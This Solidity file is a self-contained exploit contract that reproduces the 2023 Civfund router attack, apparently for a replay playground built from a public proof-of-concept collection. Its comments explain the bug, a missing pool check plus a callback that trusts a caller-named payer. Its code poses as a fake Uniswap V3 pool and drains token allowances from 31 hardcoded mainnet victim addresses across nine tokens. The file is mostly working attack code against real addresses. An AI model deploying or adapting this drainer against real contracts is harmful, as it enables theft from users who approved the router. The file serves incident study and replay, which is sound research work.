// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Civfund).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (ContractTest itself impersonates a fake Uniswap V3 pool by implementing
// mint()/token1(), and attacker = address(this)), so there is no standalone
// attack contract to deploy. This is a faithful, self-contained copy of that
// inline attack (testExploit -> loop 31x callVulnerableContract -> Civfund
// router re-enters this contract as the "pool" -> mint() -> re-enter the
// router's uniswapV3MintCallback) compiled into the registry forge project so
// the playground can deploy it and record run(). Logic and constants are
// copied verbatim from test/Civfund_exp.sol.
//
// This is the SAME bug class as 2023-07-CIVNFT (missing pool validation on a
// Uniswap-V3-style position-manager entrypoint + an unauthenticated mint
// callback that trusts a caller-supplied "payer"), but a DIFFERENT vulnerable
// contract and a LARGER-scale exploit: 31 distinct victims across 9 different
// ERC20 tokens are drained in one transaction, instead of CIVNFT's single
// victim / single token.
//
// Root cause (Civfund router 0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826 --
// UNVERIFIED on Etherscan; behavior reconstructed from the execution trace,
// see <registry>/2023-07-Civfund_exp/Civfund_exp.md):
//   1. The public entrypoint (selector 0x5ffe72b7) accepts an arbitrary "pool"
//      address (4th argument) and stores it as the active pool (slot 151),
//      then calls back into pool.mint(...) -- never validating the address
//      against the canonical Uniswap V3 factory.
//   2. uniswapV3MintCallback trusts msg.sender to be that same fake pool for
//      BOTH the token identity (reads token1() off msg.sender) and reads the
//      `payer` straight out of the attacker-supplied `data` blob, then calls
//      token1.transferFrom(payer, msg.sender, amount1) against whatever
//      standing ERC20 allowance `payer` previously granted the router.
// Composed: anyone can drain any account that ever approved the router, for
// whichever token that account approved -- repeated once per victim in a loop.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
}

interface ICivfundRouter {
    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract CivfundDrain {
    ICivfundRouter private constant VULNERABLE_CONTRACT =
        ICivfundRouter(0x7CAEC5E4a3906d0919895d113F7Ed9b3a0cbf826);

    IERC20Min private constant USDT = IERC20Min(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20Min private constant BONE = IERC20Min(0x9813037ee2218799597d83D4a5B6F3b6778218d9);
    IERC20Min private constant WOOF = IERC20Min(0x6BC08509B36A98E829dFfAD49Fde5e412645d0a3);
    IERC20Min private constant LEASH = IERC20Min(0x27C70Cd1946795B66be9d954418546998b546634);
    IERC20Min private constant SANI = IERC20Min(0x4521C9aD6A3D4230803aB752Ed238BE11F8B342F);
    IERC20Min private constant ONE = IERC20Min(0x73A83269b9bbAFC427E76Be0A2C1a1db2a26f4C2);
    IERC20Min private constant CELL = IERC20Min(0x26c8AFBBFE1EBaca03C2bB082E69D0476Bffe099);
    IERC20Min private constant USDC = IERC20Min(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20Min private constant SHIB = IERC20Min(0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE);

    address[31] private victims = [
        0x18b5f62c3830668D64F859A5a71511B2132075F1,
        0x22F6b9Cc8E670f6Ad4F43896edeC7E98eae8B6A1,
        0x783e2F71d8967BDEE8Aa2bA0f3B9f402Ac871365,
        0x8F159f13f64dB18B8A0742c86Fa8B225CeAd6C5d,
        0x6a6597CD92D2A78101CC7f2d3BEf3BBfa264f09C,
        0x899b11881f977AEb5D9Fac5105ce62c877f11763,
        0x4035918D8e0231D6bF5fFB72Add9EDC917DCfcfa,
        0x46DaD8f630736C7265849422F943efD77CB8714f,
        0x7b05363f549c929C3dA930f6728e3D74806E4103,
        0xC21A3B81Efbba41DD319191b07A20eB1f5EeBd61,
        0x26d61E57C44525d25AAD4ef20bcE3F7aA9D64C4c,
        0x71f69A5611375DC6FCBe72044b0a2363fCb0d967,
        0xC5CC992AAf6ECaC0a1074fa4435ac36FD51FFEEd,
        0x498C3274D8DdEe9e1C727f31232e2e41Ab55BAf9,
        0x7b05363f549c929C3dA930f6728e3D74806E4103,
        0x32923bF50f9D4D182c9dc09A66fB9167b9AB91bF,
        0x0a78FBeb89EE251C0d78E0eeB5E6bb7524A8939f,
        0xCfd3eF97272777F6D814344AE93dd6C69b27f214,
        0x0e1DF04fea7411A393f5Ac2a1907b5e292280bfa,
        0xD156a9E6F661F4Ea23B21dbDddB1a39dBeA63e65,
        0x512e9701D314b365921BcB3b8265658A152C9fFD,
        0xbc1843A7dAa380D4e7412D829Adc85627c3f0eD9,
        0x853fd548dE9a1b8F94BcFF480DD9fEa6E0f20BB0,
        0xF2cdD8b147802a07F862C9dc125190e0653795a2,
        0x526FeE3a5EE9913019Fa943668F0A8712e6349A6,
        0xe0643f2C33F5a7A97B25129F0552f2f1a45Fc4BA,
        0x7e585B185fC67BC5f815B7Abf459300418Aa9f97,
        0x9EAaeaB7255296E68Ad1F12b969B9e30D1806c9d,
        0x5c7F06399ffD6707a8FCAF248661aBAbF160CD63,
        0xc0E3424A3B43bfd86a125a2C9704ce445fFc8bb8,
        0x3C0F97eBc34aD870414176e5e9126f31166eC1A9
    ];

    // The asset of each victim above (victims[i] approved victimsAssets[i] to the router).
    IERC20Min[31] private victimsAssets = [
        USDT,
        USDT,
        BONE,
        WOOF,
        LEASH,
        SANI,
        USDT,
        USDT,
        USDT,
        ONE,
        CELL,
        USDT,
        USDT,
        USDT,
        USDC,
        SHIB,
        ONE,
        LEASH,
        USDT,
        USDT,
        ONE,
        USDT,
        USDT,
        ONE,
        USDT,
        USDT,
        ONE,
        SANI,
        USDT,
        USDT,
        USDT
    ];

    // Tracks which victim/token pair the fake pool's mint() should target next.
    uint256 private counter = 0;

    // entrypoint recorded by the playground -- mirrors testExploit()
    function run() external {
        // Step 1: call the vulnerable router's unprotected entrypoint once per victim.
        for (uint256 i; i < victims.length; ++i) {
            callVulnerableContract();
        }
    }

    // --- fake Uniswap V3 pool re-entrypoint (the router calls this on "pool") ---

    // Step 2: called back by the router (believing this contract is a real pool).
    // Re-enters the router's own callback, naming the CURRENT victim as payer.
    function mint(address recipient, int24 tickLower, int24 tickUpper, uint128 amount, bytes calldata data)
        external
        returns (uint128 amount0, uint128 amount1)
    {
        uniswapV3MintCallback(counter);
        ++counter;
        return (10, 11);
    }

    // The router reads the token to pull FROM the fake pool itself -- this
    // lets the attacker pick, per iteration, exactly which approved token the
    // router will drain from the current victim.
    function token1() external view returns (address) {
        return address(victimsAssets[counter]);
    }

    // --- the two calls that make up one drain iteration -------------------------

    function callVulnerableContract() internal {
        (bool success,) = address(VULNERABLE_CONTRACT).call(
            abi.encodeWithSelector(bytes4(0x5ffe72b7), 0, 0, 0, address(this), 0, 0, 0)
        );
        require(success, "Call to Civfund router failed");
    }

    function uniswapV3MintCallback(uint256 num) internal {
        VULNERABLE_CONTRACT.uniswapV3MintCallback(
            0, victimsAssets[num].balanceOf(victims[num]), abi.encode(victims[num])
        );
    }
}
